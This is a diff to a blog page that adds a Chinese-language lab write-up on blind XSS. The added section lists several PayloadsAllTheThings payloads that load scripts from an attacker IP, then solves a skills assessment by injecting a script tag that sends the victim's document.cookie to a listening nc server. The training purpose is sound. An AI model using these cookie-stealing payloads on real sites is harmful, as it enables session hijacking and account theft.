@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#00bcd4>
+                <a href="/tags/base" style=color:#00a596>
                     base
                 </a>
             </span>
@@ -390,6 +390,29 @@ if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])
 <pre><code class="html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p>因此，我们可以使用它来执行虚拟机上提供的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们正在注入的字段的名称，这样，当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段</p>
+<p>如果我们收到&#x2F;username的请求，那么我们就知道username字段容易受到XSS的攻击，等等。这样，我们就可以开始测试加载远程脚本的各种XSS有效载荷，并查看其中哪些向我们发送请求。以下是我们可以从PayloadsAllTheThings中使用的几个示例：</p>
+<pre><code class="html">&quot;&gt;&lt;script src=&quot;http://10.10.16.26/script.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<pre><code>&quot;&gt;&lt;script new Image().src=&#39;http:/10.10.16.26/index.php?c=&#39;+document.cookie;&gt;&lt;/script&gt;
+</code></pre>
+<pre><code class="html">&quot;&gt;&lt;script src=http://10.10.16.26&gt;&lt;/script&gt;
+javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://10.10.16.26\&#39;;document.body.appendChild(a)&#39;)
+&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//10.10.16.26&quot;);a.send();&lt;/script&gt;
+&lt;script&gt;$.getScript(&quot;http://10.10.16.26&quot;)&lt;/script&gt;
+</code></pre>
+<h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>What is the value of the ‘flag’ cookie?</p>
+<p>网站大概是这么样子：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181824401.png" alt="image-20230818182419290"></p>
+<p>发现没有url回显，只能手工注入检测</p>
+<p>最后测试发现注入点是最下面的website</p>
+<p>注入：</p>
+<pre><code class="js">&quot;&gt;&lt;script src=&quot;http://10.10.16.26:8080/script.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>然后本地script.js:</p>
+<pre><code>new Image().src=&#39;http://10.10.16.26:8080/index.php?c=&#39;+document.cookie;
+</code></pre>
+<p>然后用nc监听一下8080端口或者在8080端口启动一个服务器：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181836067.png" alt="image-20230818183623972"></p>
 
     </div>
 
